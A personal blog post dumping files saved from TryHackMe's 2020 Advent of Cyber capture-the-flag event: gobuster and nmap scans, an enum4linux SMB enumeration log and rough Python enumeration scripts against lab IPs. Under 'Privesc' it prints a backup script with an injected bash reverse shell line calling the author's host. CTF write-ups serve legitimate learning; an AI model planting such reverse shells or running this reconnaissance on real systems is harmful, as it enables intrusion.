---
layout:     post
title:      Advent of Cyber Dump
date:       2020-12-25
summary:    Tryhackme.com's 2020 Advent of Cyber event document dump
categories: CTF
thumbnail: cogs
tags:
 - CTF
---
Just finished Tryhackme's 25 day cybersecurity event earlier today.  
It was a fun event, which included a lot of interesting information.  
Most notably for me was using radare2 for basic reverse engineering.  
Overall, the event was a 25 day hand's on reiteration of cybersecurity fundamentals.  
It was fun and I specifically learned a lot more about Burp and reverse shell nuances.  
Dumping the files that I happened to save, in no particular order, 
and omitting ridiculously long flat files.  

Directory Fuzzes
{% highlight ruby %}
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.224.136:65000
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/12/24 22:37:42 Starting gobuster
===============================================================
/uploads.php (Status: 200)
/api (Status: 301)
/assets (Status: 301)
/index.php (Status: 200)
/server-status (Status: 403)
/grid (Status: 301)
/index.php (Status: 200)
===============================================================
2020/12/24 23:20:52 Finished
===============================================================

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.57.224
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,txt,php
[+] Timeout:        10s
===============================================================
2020/12/05 09:55:58 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.html (Status: 403)
/.htaccess.txt (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.html (Status: 403)
/.htpasswd.txt (Status: 403)
/LICENSE (Status: 200)
/api (Status: 301)
/index.html (Status: 200)
/server-status (Status: 403)
===============================================================
2020/12/05 10:29:55 Finished
===============================================================
{% endhighlight %}

Privesc
{% highlight ruby %}
#!/bin/bash
bash -i >& /dev/tcp/10.2.53.105/4444 0>&1
# Created by ElfMcEager to backup all of Santa's goodies!

# Create backups to include date DD/MM/YYYY
filename="backup_`date +%d`_`date +%m`_`date +%Y`.tar.gz";

# Backup FTP folder and store in elfmceager's home directory
tar -zcvf /home/elfmceager/$filename /opt/ftp

# TO-DO: Automate transfer of backups to backup server

Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Dec 10 21:06:27 2020

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.10.185.197
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===================================================== 
|    Enumerating Workgroup/Domain on 10.10.185.197    |
 ===================================================== 
[+] Got domain/workgroup name: TBFC-SMB-01

 ============================================= 
|    Nbtstat Information for 10.10.185.197    |
 ============================================= 
Looking up status of 10.10.185.197
	TBFC-SMB        <00> -         B <ACTIVE>  Workstation Service
	TBFC-SMB        <03> -         B <ACTIVE>  Messenger Service
	TBFC-SMB        <20> -         B <ACTIVE>  File Server Service
	..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
	TBFC-SMB-01     <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
	TBFC-SMB-01     <1d> -         B <ACTIVE>  Master Browser
	TBFC-SMB-01     <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

	MAC Address = 00-00-00-00-00-00

 ====================================== 
|    Session Check on 10.10.185.197    |
 ====================================== 
[+] Server 10.10.185.197 allows sessions using username '', password ''

 ============================================ 
|    Getting domain SID for 10.10.185.197    |
 ============================================ 
Domain Name: TBFC-SMB-01
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ======================================= 
|    OS information on 10.10.185.197    |
 ======================================= 
[+] Got OS info for 10.10.185.197 from smbclient: 
[+] Got OS info for 10.10.185.197 from srvinfo:
	TBFC-SMB       Wk Sv PrQ Unx NT SNT tbfc-smb server (Samba, Ubuntu)
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03

 ============================== 
|    Users on 10.10.185.197    |
 ============================== 
index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: elfmcskidy	Name: 	Desc: 
index: 0x2 RID: 0x3ea acb: 0x00000010 Account: elfmceager	Name: elfmceager	Desc: 
index: 0x3 RID: 0x3e9 acb: 0x00000010 Account: elfmcelferson	Name: 	Desc: 

user:[elfmcskidy] rid:[0x3e8]
user:[elfmceager] rid:[0x3ea]
user:[elfmcelferson] rid:[0x3e9]

 ========================================== 
|    Share Enumeration on 10.10.185.197    |
 ========================================== 

	Sharename       Type      Comment
	---------       ----      -------
	tbfc-hr         Disk      tbfc-hr
	tbfc-it         Disk      tbfc-it
	tbfc-santa      Disk      tbfc-santa
	IPC$            IPC       IPC Service (tbfc-smb server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.185.197
//10.10.185.197/tbfc-hr	Mapping: DENIED, Listing: N/A
//10.10.185.197/tbfc-it	Mapping: DENIED, Listing: N/A
//10.10.185.197/tbfc-santa	Mapping: OK, Listing: OK
//10.10.185.197/IPC$	[E] Can't understand response:
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ===================================================== 
|    Password Policy Information for 10.10.185.197    |
 ===================================================== 


[+] Attaching to 10.10.185.197 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

	[+] TBFC-SMB
	[+] Builtin

[+] Password Info for Domain: TBFC-SMB

	[+] Minimum password length: 5
	[+] Password history length: None
	[+] Maximum password age: 37 days 6 hours 21 minutes 
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: None
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: 37 days 6 hours 21 minutes 


[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5


 =============================== 
|    Groups on 10.10.185.197    |
 =============================== 

[+] Getting builtin groups:

[+] Getting builtin group memberships:

[+] Getting local groups:

[+] Getting local group memberships:

[+] Getting domain groups:

[+] Getting domain group memberships:

 ======================================================================== 
|    Users on 10.10.185.197 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================== 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-3823526196-2163436115-3915495932
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-32 and logon username '', password ''
S-1-5-32-500 *unknown*\*unknown* (8)
S-1-5-32-501 *unknown*\*unknown* (8)
S-1-5-32-502 *unknown*\*unknown* (8)
S-1-5-32-503 *unknown*\*unknown* (8)
S-1-5-32-504 *unknown*\*unknown* (8)
S-1-5-32-505 *unknown*\*unknown* (8)
S-1-5-32-506 *unknown*\*unknown* (8)
S-1-5-32-507 *unknown*\*unknown* (8)
S-1-5-32-508 *unknown*\*unknown* (8)
S-1-5-32-509 *unknown*\*unknown* (8)
S-1-5-32-510 *unknown*\*unknown* (8)
S-1-5-32-511 *unknown*\*unknown* (8)
S-1-5-32-512 *unknown*\*unknown* (8)
S-1-5-32-513 *unknown*\*unknown* (8)
S-1-5-32-514 *unknown*\*unknown* (8)
S-1-5-32-515 *unknown*\*unknown* (8)
S-1-5-32-516 *unknown*\*unknown* (8)
S-1-5-32-517 *unknown*\*unknown* (8)
S-1-5-32-518 *unknown*\*unknown* (8)
S-1-5-32-519 *unknown*\*unknown* (8)
S-1-5-32-520 *unknown*\*unknown* (8)
S-1-5-32-521 *unknown*\*unknown* (8)
S-1-5-32-522 *unknown*\*unknown* (8)
S-1-5-32-523 *unknown*\*unknown* (8)
S-1-5-32-524 *unknown*\*unknown* (8)
S-1-5-32-525 *unknown*\*unknown* (8)
S-1-5-32-526 *unknown*\*unknown* (8)
S-1-5-32-527 *unknown*\*unknown* (8)
S-1-5-32-528 *unknown*\*unknown* (8)
S-1-5-32-529 *unknown*\*unknown* (8)
S-1-5-32-530 *unknown*\*unknown* (8)
S-1-5-32-531 *unknown*\*unknown* (8)
S-1-5-32-532 *unknown*\*unknown* (8)
S-1-5-32-533 *unknown*\*unknown* (8)
S-1-5-32-534 *unknown*\*unknown* (8)
S-1-5-32-535 *unknown*\*unknown* (8)
S-1-5-32-536 *unknown*\*unknown* (8)
S-1-5-32-537 *unknown*\*unknown* (8)
S-1-5-32-538 *unknown*\*unknown* (8)
S-1-5-32-539 *unknown*\*unknown* (8)
S-1-5-32-540 *unknown*\*unknown* (8)
S-1-5-32-541 *unknown*\*unknown* (8)
S-1-5-32-542 *unknown*\*unknown* (8)
S-1-5-32-543 *unknown*\*unknown* (8)
S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)
S-1-5-32-1000 *unknown*\*unknown* (8)
S-1-5-32-1001 *unknown*\*unknown* (8)
S-1-5-32-1002 *unknown*\*unknown* (8)
S-1-5-32-1003 *unknown*\*unknown* (8)
S-1-5-32-1004 *unknown*\*unknown* (8)
S-1-5-32-1005 *unknown*\*unknown* (8)
S-1-5-32-1006 *unknown*\*unknown* (8)
S-1-5-32-1007 *unknown*\*unknown* (8)
S-1-5-32-1008 *unknown*\*unknown* (8)
S-1-5-32-1009 *unknown*\*unknown* (8)
S-1-5-32-1010 *unknown*\*unknown* (8)
S-1-5-32-1011 *unknown*\*unknown* (8)
S-1-5-32-1012 *unknown*\*unknown* (8)
S-1-5-32-1013 *unknown*\*unknown* (8)
S-1-5-32-1014 *unknown*\*unknown* (8)
S-1-5-32-1015 *unknown*\*unknown* (8)
S-1-5-32-1016 *unknown*\*unknown* (8)
S-1-5-32-1017 *unknown*\*unknown* (8)
S-1-5-32-1018 *unknown*\*unknown* (8)
S-1-5-32-1019 *unknown*\*unknown* (8)
S-1-5-32-1020 *unknown*\*unknown* (8)
S-1-5-32-1021 *unknown*\*unknown* (8)
S-1-5-32-1022 *unknown*\*unknown* (8)
S-1-5-32-1023 *unknown*\*unknown* (8)
S-1-5-32-1024 *unknown*\*unknown* (8)
S-1-5-32-1025 *unknown*\*unknown* (8)
S-1-5-32-1026 *unknown*\*unknown* (8)
S-1-5-32-1027 *unknown*\*unknown* (8)
S-1-5-32-1028 *unknown*\*unknown* (8)
S-1-5-32-1029 *unknown*\*unknown* (8)
S-1-5-32-1030 *unknown*\*unknown* (8)
S-1-5-32-1031 *unknown*\*unknown* (8)
S-1-5-32-1032 *unknown*\*unknown* (8)
S-1-5-32-1033 *unknown*\*unknown* (8)
S-1-5-32-1034 *unknown*\*unknown* (8)
S-1-5-32-1035 *unknown*\*unknown* (8)
S-1-5-32-1036 *unknown*\*unknown* (8)
S-1-5-32-1037 *unknown*\*unknown* (8)
S-1-5-32-1038 *unknown*\*unknown* (8)
S-1-5-32-1039 *unknown*\*unknown* (8)
S-1-5-32-1040 *unknown*\*unknown* (8)
S-1-5-32-1041 *unknown*\*unknown* (8)
S-1-5-32-1042 *unknown*\*unknown* (8)
S-1-5-32-1043 *unknown*\*unknown* (8)
S-1-5-32-1044 *unknown*\*unknown* (8)
S-1-5-32-1045 *unknown*\*unknown* (8)
S-1-5-32-1046 *unknown*\*unknown* (8)
S-1-5-32-1047 *unknown*\*unknown* (8)
S-1-5-32-1048 *unknown*\*unknown* (8)
S-1-5-32-1049 *unknown*\*unknown* (8)
S-1-5-32-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-5-21-3823526196-2163436115-3915495932 and logon username '', password ''
S-1-5-21-3823526196-2163436115-3915495932-500 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-501 TBFC-SMB\nobody (Local User)
S-1-5-21-3823526196-2163436115-3915495932-502 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-503 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-504 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-505 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-506 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-507 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-508 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-509 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-510 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-511 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-512 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-513 TBFC-SMB\None (Domain Group)
S-1-5-21-3823526196-2163436115-3915495932-514 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-515 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-516 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-517 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-518 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-519 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-520 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-521 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-522 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-523 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-524 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-525 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-526 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-527 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-528 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-529 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-530 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-531 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-532 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-533 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-534 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-535 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-536 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-537 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-538 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-539 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-540 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-541 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-542 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-543 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-544 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-545 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-546 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-547 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-548 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-549 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-550 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1000 TBFC-SMB\elfmcskidy (Local User)
S-1-5-21-3823526196-2163436115-3915495932-1001 TBFC-SMB\elfmcelferson (Local User)
S-1-5-21-3823526196-2163436115-3915495932-1002 TBFC-SMB\elfmceager (Local User)
S-1-5-21-3823526196-2163436115-3915495932-1003 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1004 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1005 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1006 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1007 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1008 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1009 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1010 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1011 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1012 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1013 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1014 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1015 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1016 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1017 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1018 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1019 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1020 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1021 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1022 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1023 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1024 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1025 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1026 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1027 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1028 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1029 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1030 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1031 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1032 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1033 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1034 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1035 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1036 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1037 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1038 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1039 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1040 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1041 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1042 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1043 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1044 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1045 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1046 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1047 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1048 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1049 *unknown*\*unknown* (8)
S-1-5-21-3823526196-2163436115-3915495932-1050 *unknown*\*unknown* (8)
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\elfmceager (Local User)
S-1-22-1-1001 Unix User\elfmcelferson (Local User)
S-1-22-1-1002 Unix User\elfmcskidy (Local User)

 ============================================== 
|    Getting printer info for 10.10.185.197    |
 ============================================== 
No printers returned.


enum4linux complete on Thu Dec 10 21:20:39 2020

{% endhighlight %}

Python Scripts
{% highlight ruby %}
import requests

for api_key in range(1,100,2):
    print(f"api_key {api_key}")
    html = requests.get(f'http://10.10.23.109:8000/api/{api_key}')
    print(html.text)
    
from bs4 import BeautifulSoup
import requests

html = requests.get('http://10.10.23.109:8000/')

soup = BeautifulSoup(html.text, "lxml")

print(soup)
links = soup.find_all('a href')
# print(links)
for link in links:
    if "href" in link.attrs:
        print(link["href"])
        
from bs4 import BeautifulSoup
import requests

url = http://10.10.200.159:8000/api/
urlkey = url + key
key = x

# post a key
r = requests.post(urlkey), data = {'data_id': key}
{% endhighlight %}


Nmap Scans
{% highlight ruby %}
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-05 20:54 CST
Nmap scan report for 10.10.107.59
Host is up (0.21s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 35:30:91:45:b9:d1:ed:5a:13:42:3e:20:95:6d:c7:b7 (RSA)
|   256 f5:69:6a:7b:c8:ac:89:b5:38:93:50:2f:05:24:22:70 (ECDSA)
|_  256 8f:4d:37:ba:40:12:05:fa:f0:e6:d6:82:fb:65:52:e8 (ED25519)
3000/tcp open  http    PHP cli server 5.5 or later (PHP 7.4.12)
|_http-title: Really Insecure PHP Page
3306/tcp open  mysql   MySQL 8.0.22
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.22
|   Thread ID: 61
|   Capabilities flags: 65535
|   Some Capabilities: LongPassword, IgnoreSpaceBeforeParenthesis, ODBCClient, IgnoreSigpipes, Speaks41ProtocolNew, ConnectWithDatabase, Speaks41ProtocolOld, FoundRows, SupportsCompression, Support41Auth, DontAllowDatabaseTableColumn, SupportsTransactions, InteractiveClient, LongColumnFlag, SupportsLoadDataLocal, SwitchToSSLAfterHandshake, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: \x17>\x06\x0C\x07\\\x17d\x1D\x17\x0C"Q*98\x01S;
|_  Auth Plugin Name: caching_sha2_password
| ssl-cert: Subject: commonName=MySQL_Server_8.0.22_Auto_Generated_Server_Certificate
| Not valid before: 2020-11-19T19:12:24
|_Not valid after:  2030-11-17T19:12:24
|_ssl-date: TLS randomness does not represent time
8000/tcp open  http    Gunicorn 20.0.4
|_http-server-header: gunicorn/20.0.4
|_http-title: Santa's forum
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=12/5%OT=22%CT=1%CU=30685%PV=Y%DS=4%DC=T%G=Y%TM=5FCC483
OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=A)OPS
OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1
OS:1NW7%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
OS:(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   65.07 ms  10.2.0.1
2   ... 3
4   199.95 ms 10.10.107.59

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 62.52 seconds

# Nmap 7.91 scan initiated Sat Dec 12 14:08:14 2020 as: nmap -A -Pn --reason -oN nmap12 10.10.165.97
Nmap scan report for 10.10.165.97
Host is up, received user-set (0.25s latency).
Not shown: 997 filtered ports
Reason: 997 no-responses
PORT     STATE SERVICE            REASON  VERSION
3389/tcp open  ssl/ms-wbt-server? syn-ack
| rdp-ntlm-info: 
|   Target_Name: TBFC-WEB-01
|   NetBIOS_Domain_Name: TBFC-WEB-01
|   NetBIOS_Computer_Name: TBFC-WEB-01
|   DNS_Domain_Name: tbfc-web-01
|   DNS_Computer_Name: tbfc-web-01
|   Product_Version: 10.0.17763
|_  System_Time: 2020-12-12T20:09:04+00:00
| ssl-cert: Subject: commonName=tbfc-web-01
| Not valid before: 2020-11-27T01:29:04
|_Not valid after:  2021-05-29T01:29:04
|_ssl-date: 2020-12-12T20:09:07+00:00; -1m31s from scanner time.
8009/tcp open  ajp13              syn-ack Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http               syn-ack Apache Tomcat 9.0.17
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/9.0.17

Host script results:
|_clock-skew: mean: -1m31s, deviation: 0s, median: -1m31s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Dec 12 14:10:39 2020 -- 1 IP address (1 host up) scanned in 144.69 seconds

# Nmap 7.91 scan initiated Sun Dec 13 20:42:03 2020 as: nmap -A -oN nmap13 10.10.133.248
Nmap scan report for 10.10.133.248
Host is up (0.20s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 68:60:de:c2:2b:c6:16:d8:5b:88:be:e3:cc:a1:25:75 (DSA)
|   2048 50:db:75:ba:11:2f:43:c9:ab:14:40:6d:7f:a1:ee:e3 (RSA)
|_  256 11:5d:55:29:8a:77:d8:08:b4:00:9b:a3:61:93:fe:e5 (ECDSA)
23/tcp  open  telnet  Linux telnetd
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          39772/udp   status
|   100024  1          41651/tcp6  status
|   100024  1          53144/udp6  status
|_  100024  1          55977/tcp   status
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Dec 13 20:42:43 2020 -- 1 IP address (1 host up) scanned in 40.09 seconds

# Nmap 7.91 scan initiated Thu Dec 24 21:46:13 2020 as: nmap -sV -A -oN nmap24 10.10.224.136
Nmap scan report for 10.10.224.136
Host is up (0.20s latency).
Not shown: 998 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
65000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Light Cycle
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=12/24%OT=80%CT=1%CU=40378%PV=Y%DS=4%DC=T%G=Y%TM=5FE560
OS:C0%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST
OS:11NW6%O6=M505ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC
OS:N(R=Y%DF=Y%T=40%W=F507%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
